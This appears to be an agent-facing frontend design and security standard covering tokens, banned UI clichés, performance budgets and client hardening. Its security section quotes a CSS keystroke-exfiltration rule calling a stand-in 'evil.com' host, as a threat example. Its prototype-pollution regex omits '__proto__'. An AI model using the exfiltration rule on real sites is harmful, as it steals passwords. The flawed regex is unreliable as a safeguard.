# Universal Frontend Design Bible & Anti-Slop Architectural Standard

> **Authority & Scope:** This document defines the non-negotiable architectural, aesthetic, and security standards for all frontend interfaces in this repository and downstream projects. Every agent and engineer MUST reference this specification and maintain an anchored root `DESIGN.md` before generating or modifying user interfaces.

---

## 1. Executive Summary & Design System Philosophy

Modern user interfaces must eliminate generic AI templates in favor of agency-grade craft, mathematical precision, and zero-trust security. Design is an engineering discipline governed by deterministic token systems, rigid layout geometry, and strict performance bounds.

```yaml
frontend_design_constitution:
  axiom_1_design_token_primacy:
    principle: "Zero-Primitive Ingestion Invariant"
    rule: "Components must NEVER consume raw color hex codes, hardcoded pixel spacings, or arbitrary z-indices. All visual attributes must ingest semantic tokens."
  axiom_2_anti_slop_imperative:
    principle: "Extermination of AI Aesthetic Archetypes"
    rule: "Banish generic purple radial glows, floating 3D isometric cubes, identical 3-column feature cards, and meaningless buzzword headlines."
  axiom_3_performance_as_visual_hygiene:
    principle: "Sub-Second Perceived & Runtime Fluidity"
    rule: "Every view must satisfy Core Web Vitals at p75 (LCP <= 2.0s, INP <= 150ms, CLS <= 0.05), enforce 60/120fps frame budgets, and bound DOM nodes to <= 1200."
  axiom_4_defensive_client_security:
    principle: "Zero-Trust Client Boundary"
    rule: "Treat the browser DOM, URL parameters, external SVGs, and client storage as untrusted perimeters. Enforce Trusted Types, DOMPurify, and strict CSP."
  axiom_5_verified_reality:
    principle: "Physical Verification Over Speculation"
    rule: "No interface is complete without automated Playwright end-to-end assertions, cross-breakpoint snapshots, and accessibility audits."
```

---

## 2. Watertight 5-Layer Frontend Tool Stack & Execution Lifecycle

Frontend engineering flows through five sequential, mutually exclusive layers to prevent aesthetic collisions, redundant abstractions, or unverified output.

```yaml
tool_stack_pipeline:
  layer_1_reference_grounding:
    purpose: "Extract real-world production tokens into root DESIGN.md"
    assigned_skills:
      - "awesome-design-md"
    catalog_source: "~/.agents/resources/awesome-design-md"
    protocol:
      step_1: "Inspect domain requirements and identify closest matching production system (e.g., Stripe for fintech, Linear for developer productivity, Apple for editorial/minimalism)."
      step_2: "Extract typography scales, color palettes, elevation tiers, and spacing into root DESIGN.md."
      step_3: "Never copy trademarked branding, logos, or cosmetic skins; extract structural tokens and layout mechanics only."

  layer_2_aesthetic_governor:
    purpose: "Enforce a unified visual aesthetic and tone"
    baseline_skill: "frontend-design"
    archetype_router:
      constraint: "Strictly ONE mutually exclusive archetype governor active per project or view"
      governor_options:
        minimalist_ui:
          skill: "minimalist-ui"
          aesthetic_profile: "Clean editorial, warm monochrome, typographic contrast, flat bento grids, muted pastels, zero gradients."
          ideal_domains: ["SaaS utilities", "reading platforms", "documentation", "productivity apps"]
        industrial_brutalist_ui:
          skill: "industrial-brutalist-ui"
          aesthetic_profile: "Raw mechanical interfaces, Swiss print discipline, military terminal aesthetics, rigid grids, analog degradation."
          ideal_domains: ["Data-dense monitoring", "crypto/Web3", "developer tools", "security dashboards"]
        gpt_taste:
          skill: "gpt-taste"
          aesthetic_profile: "Wide editorial typography, gapless bento layouts, GSAP ScrollTrigger pinning/scrubbing, asymmetric rhythm."
          ideal_domains: ["High-impact marketing pages", "flagship product launches", "interactive portfolios"]
        design_taste_frontend:
          skill: "design-taste-frontend"
          aesthetic_profile: "Anti-slop modern web standard, calibrated dark/light elevation, precise micro-spacing, bespoke micro-motion."
          ideal_domains: ["General production web apps", "dashboards", "customer portals"]
        high_end_visual_design:
          skill: "high-end-visual-design"
          aesthetic_profile: "Agency-grade luxury, bespoke typography, subtle ambient diffusion, multi-layered depth, flawless craft."
          ideal_domains: ["Premium fintech", "luxury lifestyle", "high-ticket enterprise"]

  layer_3_production_builders:
    purpose: "Implement component architecture and interactive elements"
    assigned_skills:
      - "frontend-ui-engineering"
      - "21st-ui-build"
      - "img2threejs"
    division_of_labor:
      frontend_ui_engineering: "Core component hierarchy, semantic HTML5, keyboard navigation, state machines, and CSS token consumption."
      21st_ui_build: "Component-level inspiration, accessible UI primitives, and refined micro-interactions."
      img2threejs: "Dedicated, sandboxed WebGL/Three.js procedural 3D hero assets only. Must isolate in lazy-loaded Canvas."

  layer_4_preflight_polish:
    purpose: "Audit heuristics, micro-typography, and component perfection"
    assigned_skills:
      - "impeccable"
      - "21st-ui-review"
    verification_targets:
      - "Micro-typography: non-breaking spaces before units, smart curly quotes, tabular numerals on metric data."
      - "Optical alignment: icon-text vertical centering, visual optical weight balancing."
      - "Empty & error states: informative zero-data illustrations, actionable recovery buttons."
      - "Interactive feedback: active, hover, focus-visible, and disabled states for every interactive node."

  layer_5_physical_verification:
    purpose: "Deterministic runtime validation and automated testing"
    assigned_skills:
      - "playwright-cli"
      - "browser-testing-with-devtools"
    execution_harness:
      - "Playwright E2E suites: multi-viewport headless runs (desktop 1440px, tablet 768px, mobile 375px)."
      - "Core Web Vitals profiling: Chrome DevTools MCP extraction of LCP, INP, and CLS."
      - "Console cleanliness: zero console errors, zero unhandled promise rejections, zero CSP violation warnings."
```

---

## 3. The 6-Category Anti-Slop Codex (What NOT to Use)

Every interface generated in this repository must strictly adhere to the Anti-Slop Codex. The following visual cliches, performance hazards, and amateur patterns are strictly prohibited.

```yaml
anti_slop_codex:
  category_1_layout_and_geometry:
    banned_patterns:
      - "3-Column Identical Feature Cards: Repeating cards with identical heights, centered circle icons, and short generic paragraphs."
      - "Floating 3D Glass Cubes & Spheres: Gratuitous isometric shapes floating aimlessly in hero sections without semantic purpose."
      - "Centered Hero Monotony: Predictable centered H1 + subtitle + dual CTA button layout on every single landing page."
      - "Unconstrained Text Measure: Paragraphs spanning across full viewport width (>75ch), causing severe visual fatigue."
    mandatory_alternatives:
      - "Asymmetric Bento Grids: Group related features into variable-width cards (e.g., 2/3 + 1/3, 1/2 + 1/2) with varying content density."
      - "Functional Media & Real UI Previews: Replace decorative shapes with interactive product widgets, live terminal snippets, or actual telemetry."
      - "Left-Aligned Editorial Hierarchy: Anchor headlines with clear typographic contrast, eyebrow badges, and contextual metadata."
      - "Optimal Reading Columns: Enforce max-width: 65ch (60-72 characters per line) on all body copy."

  category_2_color_and_surface:
    banned_patterns:
      - "Purple/Indigo Radial Glow: Gratuitous dark-theme background with a blurred radial gradient (#6366F1 / #8B5CF6) centered behind the hero."
      - "Pitch-Black Monoliths: Using pure #000000 as the background for the entire page without elevation layers or border hierarchy."
      - "Vibrant Neon Overkill: Saturated primary colors (>80% saturation) applied to large surface areas or background cards."
      - "Uncalibrated Dark Mode Inversion: Simply inverting white backgrounds to black without adjusting text contrast, producing eye-straining #FFFFFF on #000000."
    mandatory_alternatives:
      - "Directional Ambient Lighting: Subtle top-down directional linear gradients with opacity under 8% (e.g., rgba(255, 255, 255, 0.03))."
      - "5-Tier Elevation Architecture: Layer surfaces from base (#0D0F12) to raised (#14171D), overlay (#1B2028), and floating (#242B35)."
      - "Muted Brand Accents: Restrict accent colors to <= 10% of viewport area; use subtle 1px border highlights rather than flooded backgrounds."
      - "Calibrated Text Tiers: Use off-white primary text (#EDEDED / 92% opacity), muted secondary (#A1A1AA / 65%), and subtle tertiary (#71717A / 45%)."

  category_3_typography_and_scale:
    banned_patterns:
      - "AI Default Font Stacks: Defaulting to uncustomized Inter or Roboto for every application without typographic intentionality."
      - "Static Pixel Sizing: Hardcoding font sizes in px without viewport-aware fluid clamp scaling."
      - "Excessive Font Weights: Using 6+ different font weights on a single page, destroying visual harmony."
      - "Unproportional Line Heights: Heading line-heights exceeding 1.25, causing awkward multi-line spacing."
    mandatory_alternatives:
      - "Intentional Type Pairing: Pair character-rich editorial display faces (e.g., Newsreader, Playfair, Cabinet Grotesk, Syne) with legible geometric sans body (e.g., Geist, Plus Jakarta Sans, General Sans) or monospaced metrics (JetBrains Mono, IBM Plex Mono)."
      - "Fluid Clamp Mathematics: Calculate font sizes using clamp(min_rem, preferred_vw, max_rem) based on Major Third (1.25) or Perfect Fourth (1.333)."
      - "Restricted Weight Matrix: Use maximum 3 weights: Regular (400) for body, Medium (500) for UI/labels, Semibold/Bold (600/700) for headings."
      - "Tight Heading Line Heights: Heading line-height must scale between 1.05 and 1.15; body line-height must scale between 1.5 and 1.6."

  category_4_animation_and_motion:
    banned_patterns:
      - "Scroll-Trigger Stagger Fatigue: Staggered fade-up animations on every single card, text line, and element as the user scrolls."
      - "Layout-Shifting Transitions: Animating CSS height, width, top, left, margin, or padding properties, triggering massive CPU reflows."
      - "Unconstrained Particle Webs: Canvas background particles connected by trailing lines, consuming 100% CPU on mobile devices."
      - "Sluggish Durations: Transitions lasting > 400ms that make the interface feel unresponsive and heavy."
    mandatory_alternatives:
      - "Purposeful Entrances: Animate only critical hero focal points; keep below-the-fold content immediately visible or use subtle opacity fades."
      - "Compositor-Only Transitions: Animate exclusively transform and opacity properties executed on the GPU compositor thread."
      - "Subtle Micro-Interactions: Button hover and active states must execute within 150ms-200ms with cubic-bezier(0.16, 1, 0.3, 1) ease-out."
      - "Strict prefers-reduced-motion: Wrap all motion queries in @media (prefers-reduced-motion: reduce) to instantly disable non-essential animations."

  category_5_components_and_controls:
    banned_patterns:
      - "Browser Default Form Controls: Native unstyled select dropdowns, checkboxes, or radio buttons with operating system blue focus rings."
      - "Trapless Modal Overlays: Dialogs that fail to trap keyboard focus, lack Esc key dismiss, or allow background scrolling."
      - "Blank Empty States: Presenting an empty table or list as an awkward blank white or black container."
      - "Abrupt Data Flashes: Switching instantly between loading spinner and full content without layout preservation, causing severe CLS."
    mandatory_alternatives:
      - "Fully Styled Accessible Primitives: Custom accessible primitives built with Radix UI, Headless UI, or ARIA 1.2 patterns."
      - "Focus-Trapped Modals: Enforce inert attribute on background siblings, cycle Tab within dialog, dismiss on Esc, restore prior focus on close."
      - "Actionable Zero-States: Clear icon, descriptive headline, helpful explanation, and a prominent primary action to generate or import data."
      - "Geometry-Preserving Skeletons: Pulse skeletons that match exact container dimensions and layout geometries, guaranteeing CLS = 0.000."

  category_6_copywriting_and_content:
    banned_patterns:
      - "AI Buzzword Salads: 'Supercharge your workflow', 'Unlock the power of AI', 'Next-generation platform', 'Seamlessly integrate'."
      - "Meaningless Metrics: Cards claiming '99.9% customer satisfaction' or '10x faster' without verifiable context or data."
      - "Latin Lorem Ipsum: Leaving 'Lorem ipsum dolor sit amet' in production, staging, or PR previews."
      - "Vague Error Messages: 'Something went wrong. Please try again later.'"
    mandatory_alternatives:
      - "Domain-Specific Concrete Value: State exactly what the product does: 'Extract tabular financial data from scanned PDFs in under 4 seconds'."
      - "Verifiable Architectural Proof: Replace marketing fluff with concrete benchmarks, system architecture diagrams, and real output."
      - "Production-Authentic Sample Data: Populate interfaces with realistic, domain-accurate names, dates, currencies, and status codes."
      - "Actionable Error Diagnostics: State what failed, why it failed, and provide an immediate remedy (e.g., 'API rate limit exceeded. Retrying in 12s [Retry Now]')."
```

---

## 4. Token Architecture & Root `DESIGN.md` Contract

Every project MUST define its design system within a root `DESIGN.md` file located at the repository root. All component styling must reference CSS custom properties mapped to this token contract.

```yaml
token_architecture:
  hierarchy_model:
    tier_1_primitives:
      description: "Raw value definitions. NEVER consumed directly by UI components."
      examples:
        colors: ["--raw-gray-900: #0d0f12", "--raw-blue-500: #3b82f6"]
        spacing: ["--raw-space-1: 0.25rem", "--raw-space-4: 1.0rem"]
    tier_2_semantics:
      description: "Intentional design tokens mapped to primitives. Consumed by components."
      examples:
        surfaces: ["--surface-base", "--surface-raised", "--surface-overlay", "--surface-floating", "--surface-sunken"]
        content: ["--text-primary", "--text-secondary", "--text-muted", "--text-inverse"]
        actions: ["--action-primary-bg", "--action-primary-hover", "--action-danger-bg"]
        borders: ["--border-subtle", "--border-strong", "--border-focus"]
    tier_3_components:
      description: "Component-scoped overrides referencing semantic tokens."
      examples:
        button: ["--btn-padding-y: var(--space-2)", "--btn-bg: var(--action-primary-bg)"]
        card: ["--card-bg: var(--surface-raised)", "--card-border: var(--border-subtle)"]

  surface_elevation_physics:
    tier_0_sunken:
      bg: "var(--surface-sunken)"
      border: "1px solid var(--border-subtle)"
      shadow: "inset 0 2px 4px rgba(0, 0, 0, 0.2)"
      purpose: "Input wells, code editor containers, embedded canvases."
    tier_1_base:
      bg: "var(--surface-base)"
      border: "none"
      shadow: "none"
      purpose: "Root page canvas, viewport background."
    tier_2_raised:
      bg: "var(--surface-raised)"
      border: "1px solid var(--border-subtle)"
      shadow: "0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.08)"
      purpose: "Cards, panels, list containers, bento grid modules."
    tier_3_overlay:
      bg: "var(--surface-overlay)"
      border: "1px solid var(--border-strong)"
      shadow: "0 4px 12px rgba(0, 0, 0, 0.18), 0 2px 6px rgba(0, 0, 0, 0.12)"
      purpose: "Dropdown menus, popovers, navigation flyouts."
    tier_4_floating:
      bg: "var(--surface-floating)"
      border: "1px solid var(--border-strong)"
      shadow: "0 12px 32px rgba(0, 0, 0, 0.28), 0 4px 12px rgba(0, 0, 0, 0.16)"
      purpose: "Modal dialogs, command palettes (Cmd+K), toast notifications."

  fluid_typography_scale:
    scale_ratio: "Major Third (1.250) or Perfect Fourth (1.333)"
    formula: "clamp(min_size, preferred_vw, max_size)"
    definitions:
      text_xs: "clamp(0.75rem, 0.70rem + 0.25vw, 0.8125rem)"   # 12px -> 13px (captions, badges)
      text_sm: "clamp(0.875rem, 0.83rem + 0.22vw, 0.9375rem)"  # 14px -> 15px (secondary UI, tables)
      text_base: "clamp(1.000rem, 0.95rem + 0.25vw, 1.0625rem)" # 16px -> 17px (body paragraphs)
      text_lg: "clamp(1.125rem, 1.05rem + 0.38vw, 1.2500rem)"  # 18px -> 20px (subheadings, card titles)
      text_xl: "clamp(1.350rem, 1.22rem + 0.65vw, 1.5625rem)"  # 21.6px -> 25px (section titles)
      text_2xl: "clamp(1.688rem, 1.48rem + 1.04vw, 2.0313rem)" # 27px -> 32.5px (page headers)
      text_3xl: "clamp(2.109rem, 1.78rem + 1.64vw, 2.6406rem)" # 33.7px -> 42.2px (feature heroes)
      text_4xl: "clamp(2.637rem, 2.12rem + 2.58vw, 3.4332rem)" # 42.2px -> 55px (editorial display H1)

  spatial_grid_system:
    base_unit: "4px / 8px linear progression"
    tokens:
      space_1: "0.25rem"   # 4px (tight inline padding, badge margins)
      space_2: "0.50rem"   # 8px (button inline gap, list spacing)
      space_3: "0.75rem"   # 12px (form input padding, compact cards)
      space_4: "1.00rem"   # 16px (standard component padding)
      space_6: "1.50rem"   # 24px (card padding, grid gaps)
      space_8: "2.00rem"   # 32px (section sub-divisions)
      space_12: "3.00rem"  # 48px (major section gutters)
      space_16: "4.00rem"  # 64px (landing section vertical rhythm)
      space_24: "6.00rem"  # 96px (hero section top/bottom padding)

  responsive_breakpoint_contract:
    mobile_sm: "375px"   # Minimum supported target (compact smartphones)
    mobile_lg: "480px"   # Phablets / large phones
    tablet: "768px"      # Portrait tablets / 2-column shifts
    laptop: "1024px"     # Small desktops / landscape tablets / 3-column bento
    desktop: "1440px"    # Primary desktop standard / 12-column grid container
    ultrawide: "1920px"  # Enforce max-width container constraints (max 1440px content)
```

---

## 5. Core Web Vitals, Render Physics & Performance Budgets

Interfaces must pass strict mathematical performance bounds. Visual beauty without runtime performance is catastrophic failure.

```yaml
performance_and_render_budgets:
  core_web_vitals_p75_thresholds:
    lcp_largest_contentful_paint:
      desktop_target: "<= 2.0 seconds"
      mobile_target: "<= 2.5 seconds"
      measurement_condition: "75th percentile of real or simulated user visits"
    inp_interaction_to_next_paint:
      desktop_target: "<= 150 milliseconds"
      mobile_target: "<= 200 milliseconds"
      measurement_condition: "Worst-case interaction latency during session"
    cls_cumulative_layout_shift:
      strict_target: "<= 0.05"
      ideal_standard: "0.000 (absolute zero layout shift)"
      measurement_condition: "Full page session lifecycle"
    fcp_first_contentful_paint:
      target: "<= 1.0 second"
    ttfb_time_to_first_byte:
      target: "<= 0.6 seconds"

  font_loading_and_foit_prevention:
    format_mandate: "WOFF2 exclusively (gzip/brotli compressed)"
    file_size_limit: "<= 35KB per font file (subsetted glyphs for Latin + Latin-ext)"
    rendering_directive: "font-display: swap"
    preload_rule: "Preload maximum ONE primary heading or body WOFF2 font in <head>"
    fallback_metrics_override:
      mandate: "Declare size-adjust, ascent-override, and descent-override on system fallback fonts to match WOFF2 x-height, eliminating FOUT layout jumps."

  media_and_image_geometry_invariants:
    intrinsic_geometry:
      mandate: "Every <img>, <video>, and <iframe> MUST declare explicit width and height HTML attributes or CSS aspect-ratio."
      cls_defense: "Guarantees browser reserves layout box before network payload arrives."
    format_hierarchy:
      tier_1: "AVIF (primary modern format with superior compression)"
      tier_2: "WebP (broad legacy compatibility fallback)"
      tier_3: "SVG (for vector icons and geometric charts only)"
    responsive_srcset:
      mandate: "Provide 1x, 2x, and 3x srcset resolutions with explicit sizes attribute."
    decoding_directive: "decoding='async' on all non-LCP images; loading='lazy' for below-the-fold media."

  frame_rate_and_animation_physics:
    render_budget: "16.6ms per frame (60fps) or 8.33ms per frame (120fps)"
    compositor_thread_only:
      permitted_animated_properties:
        - "transform"
        - "opacity"
      strictly_banned_in_animations:
        - "height / width"
        - "top / left / right / bottom"
        - "margin / padding"
        - "border-width"
        - "box-shadow (use pseudo-element opacity transition instead)"
    will_change_discipline:
      rule: "Apply will-change: transform only on active interaction/hover; never leave will-change permanently active on hundreds of idle nodes to prevent GPU VRAM exhaustion."

  dom_complexity_and_virtualization:
    max_dom_nodes: "1200 nodes total (hard ceiling: 1500 nodes)"
    max_dom_depth: "24 levels deep (hard ceiling: 32 levels)"
    virtualization_threshold:
      mandate: "Any list, table, or grid presenting >= 60 items MUST implement window virtualization (e.g., TanStack Virtual) to recycle off-screen DOM nodes."
```

---

## 6. Client-Side Security & Threat Hardening (STRIDE & OWASP)

Frontend interfaces are execution perimeters exposed to malicious browser extensions, script injection, and adversarial network payloads. Defensive code must be active by default.

```yaml
frontend_security_architecture:
  dom_xss_and_sanitization:
    innerhtml_ban: "Direct assignment to innerHTML, outerHTML, or document.write() is strictly prohibited."
    trusted_types_mandate: "Enable Trusted Types policy where supported. Any rich HTML injection must pass through DOMPurify with strict allow-lists."
    dompurify_configuration:
      allowed_tags: ["b", "i", "em", "strong", "a", "p", "ul", "ol", "li", "code", "pre"]
      allowed_attributes:
        a: ["href", "title", "target", "rel"]
      hook_enforcement: "Enforce rel='noopener noreferrer' on all <a> tags automatically."

  svg_security_hierarchy:
    threat_vectors: "SVGs containing <script>, <foreignObject>, or malicious XML event handlers (onload, onerror, onclick)."
    permitted_rendering_methods:
      tier_1_preferred: "Render external SVGs exclusively via sandboxed <img src='icon.svg' alt='' /> where scripts cannot execute."
      tier_2_inline: "If inlining SVGs for CSS manipulation, parse and sanitize via DOMPurify with SVG profile (stripping foreignObject, use, and script tags)."

  css_exfiltration_and_ui_redressing:
    clickjacking_defense:
      header: "X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'"
      client_check: "Verify top-window frame ancestry on sensitive views."
    css_attribute_selector_defense:
      vulnerability: "Malicious stylesheets using input[type='password'][value^='a'] { background: url('//evil.com/leak/a'); } to exfiltrate keystrokes."
      mitigation: "Strict Content Security Policy style-src restricting inline and untrusted external style sheets."

  client_storage_token_ban:
    prohibition: "NEVER store sensitive authentication session tokens (JWTs, refresh tokens, API master keys) in localStorage or sessionStorage."
    risk: "Any XSS vulnerability or rogue browser extension can read window.localStorage.getItem('token') and exfiltrate credentials."
    mandate: "Store session state in httpOnly, Secure, SameSite=Strict cookies managed strictly by the server."

  prototype_pollution_defense:
    threat: "Adversarial URL query params or JSON payloads overwriting Object.prototype via deep merge utilities (e.g., __proto__, constructor.prototype)."
    sanitization_utility:
      protocol: "All deep merge or state clone utilities MUST reject keys matching /^(proto|constructor|prototype)$/."

  reverse_tabnabbing_defense:
    mandate: "Every anchor link with target='_blank' MUST declare rel='noopener noreferrer'."
    vulnerability: "Without rel='noopener', the opened tab has access to window.opener.location and can redirect the parent tab to a phishing clone."

  client_stride_threat_matrix:
    spoofing:
      threat: "Fake UI overlays or phishing modals mimicking trusted authentication prompts."
      mitigation: "Cryptographically verified origins, strict frame-ancestors, zero ambient credential prompts."
    tampering:
      threat: "Manipulating client-side pricing, role flags, or permissions in React/Vue state."
      mitigation: "Zero client authority: treat client state purely as a presentation cache; all business rules and authorization must validate server-side."
    repudiation:
      threat: "User claiming an action was triggered by UI glitch or unauthorized automated script."
      mitigation: "Cryptographic telemetry logging, CSRF tokens on state mutations, idempotency keys."
    information_disclosure:
      threat: "PII leakage in client error logs, console.log left in production, unmasked input fields."
      mitigation: "Production build minification stripping console.*, input masking for sensitive tokens/PII, error boundary redaction."
    denial_of_service:
      threat: "ReDoS in client form validation regex, unbounded DOM rendering freezing browser UI thread."
      mitigation: "Deterministic regex without catastrophic backtracking, input length ceilings, virtualized list rendering."
    elevation_of_privilege:
      threat: "DOM XSS executing arbitrary JavaScript in the context of the user's session."
      mitigation: "Trusted Types, DOMPurify sanitization, httpOnly cookies, strict Content Security Policy."

  client_owasp_top_10_matrix:
    a01_broken_access_control:
      client_context: "Hiding UI buttons (e.g. 'Admin Panel') without server authorization guards."
      enforcement: "Route-level middleware guards paired with 403 Forbidden redirects from API."
    a02_cryptographic_failures:
      client_context: "Using Math.random() for sensitive tokens, crypto keys, or salt generation."
      enforcement: "Enforce window.crypto.getRandomValues() for all cryptographic operations."
    a03_injection_xss:
      client_context: "Rendering unescaped user query strings or URL fragments into the DOM."
      enforcement: "React JSX escaping by default, DOMPurify for rich HTML, zero eval() or new Function()."
    a05_security_misconfiguration:
      client_context: "Permissive CSP allowing 'unsafe-inline' or 'unsafe-eval'."
      enforcement: "Nonce-based or hash-based CSP, strict connect-src white-listing."
    a07_identification_and_auth_failures:
      client_context: "Session timeout failure, leaving sensitive data in client state after logout."
      enforcement: "Explicit client state purge (Redux/Zustand store reset) upon session expiration or logout."
```

---

## 7. Legacy Strangler Fig Refactoring & Design Drift Prevention

Existing frontend codebases must be systematically modernized using the Strangler Fig protocol to eliminate technical debt without breaking existing user flows.

```yaml
legacy_refactoring_and_drift_protocol:
  strangler_fig_methodology:
    phase_1_boundary_isolation:
      action: "Identify target legacy view or component and define clean TypeScript contract boundaries."
    phase_2_token_root_injection:
      action: "Establish root DESIGN.md tokens and import semantic CSS variables into legacy stylesheets."
    phase_3_dual_run_verification:
      action: "Mount modernized component behind a feature flag; verify identical state machine behavior and zero regression via Playwright."
    phase_4_legacy_severance:
      action: "Reroute production traffic to modern component, prune old legacy component, delete dead styles, and verify bundle size reduction."

  design_drift_prevention_guards:
    hardcoded_values_regex_audit:
      colors_regex: "#[0-9a-fA-F]{3,8}|rgb\\([^)]+\\)|hsl\\([^)]+\\)"
      enforcement: "Lint rule blocking raw color codes in component files; all colors must reference var(--surface-*), var(--text-*), etc."
      pixel_margin_padding_regex: "(margin|padding):\\s*([0-9]+px)"
      enforcement: "Flag non-standard pixel values; enforce var(--space-*) token usage."
    token_completeness_gate:
      action: "Pre-commit check validating that every CSS variable used in src/ exists in DESIGN.md."
```

---

## 8. Frontend Smoke Verification & Golden-Path Quality Gates

In a ~6-hour hackathon speedrun, writing dedicated 4-tier test suites (Big-O frame bounds, DOM leak tests, and STRIDE security fuzzing scripts) is **strictly suspended**. Frontend verification is performed through clean compilation and real browser smoke validation:

```yaml
hackathon_frontend_verification:
  compilation_gate:
    command: "npm run build" # or "tsc --noEmit"
    criteria: "Clean compilation with zero TypeScript errors or syntax parse failures."

  golden_path_browser_gate:
    visual_inspection:
      - "Layout: Multi-viewport presentation is clean without horizontal overflow or clipped text."
      - "Contrast: Typography is readable and high-contrast (WCAG AA compliant)."
      - "Interactions: Buttons, dropdowns, and modals open and close smoothly."
    demo_flow_check:
      - "Preset Activation: '⚡ Load Judge Demo' button hydrates inputs instantly with realistic data."
      - "Core Execution: The primary differentiating feature executes end-to-end."
      - "Console Cleanliness: DevTools console has zero red errors or unhandled promise rejections."
      - "Fail-Safe Fallback: Offline mock JSON fixture triggers seamlessly if external APIs lag (>3s) or fail."
```

---

## 9. Canonical Root `DESIGN.md` Schema

When initializing or updating a project's root `DESIGN.md`, the document MUST strictly conform to the following Hybrid YAML structure.

```yaml
canonical_design_md_schema:
  metadata:
    project_name: "Project Descriptor"
    reference_system: "awesome-design-md reference (e.g., Stripe, Linear, Apple)"
    aesthetic_governor: "minimalist-ui | industrial-brutalist-ui | gpt-taste | design-taste-frontend | high-end-visual-design"
    created_at: "ISO-8601 Timestamp"

  color_system:
    mode: "dual (light & dark) with system preference detection"
    primitives:
      gray: { "900": "#0d0f12", "800": "#14171d", "700": "#1b2028", "200": "#e4e4e7", "50": "#fafafa" }
      accent: { "primary": "#3b82f6", "hover": "#2563eb", "subtle": "rgba(59, 130, 246, 0.12)" }
    semantics:
      surfaces:
        sunken: "var(--raw-gray-900)"
        base: "var(--raw-gray-800)"
        raised: "var(--raw-gray-700)"
        overlay: "#242b35"
        floating: "#2d3542"
      text:
        primary: "#ededed"
        secondary: "#a1a1aa"
        muted: "#71717a"
        accent: "var(--accent-primary)"

  typography:
    display_family: "Cabinet Grotesk, sans-serif"
    body_family: "Geist, -apple-system, BlinkMacSystemFont, sans-serif"
    mono_family: "JetBrains Mono, monospace"
    scale_ratio: "1.250 (Major Third)"
    fluid_clamp_tokens:
      text-xs: "clamp(0.75rem, 0.70rem + 0.25vw, 0.8125rem)"
      text-sm: "clamp(0.875rem, 0.83rem + 0.22vw, 0.9375rem)"
      text-base: "clamp(1.000rem, 0.95rem + 0.25vw, 1.0625rem)"
      text-lg: "clamp(1.125rem, 1.05rem + 0.38vw, 1.2500rem)"
      text-xl: "clamp(1.350rem, 1.22rem + 0.65vw, 1.5625rem)"
      text-2xl: "clamp(1.688rem, 1.48rem + 1.04vw, 2.0313rem)"
      text-3xl: "clamp(2.109rem, 1.78rem + 1.64vw, 2.6406rem)"
      text-4xl: "clamp(2.637rem, 2.12rem + 2.58vw, 3.4332rem)"

  spatial_and_layout:
    grid_base: "8px"
    max_content_width: "1440px"
    reading_measure_max: "65ch"
    border_radius:
      sm: "4px"
      md: "8px"
      lg: "12px"
      full: "9999px"

  motion:
    standard_ease: "cubic-bezier(0.16, 1, 0.3, 1)"
    fast_duration: "150ms"
    base_duration: "250ms"
    slow_duration: "350ms"
```
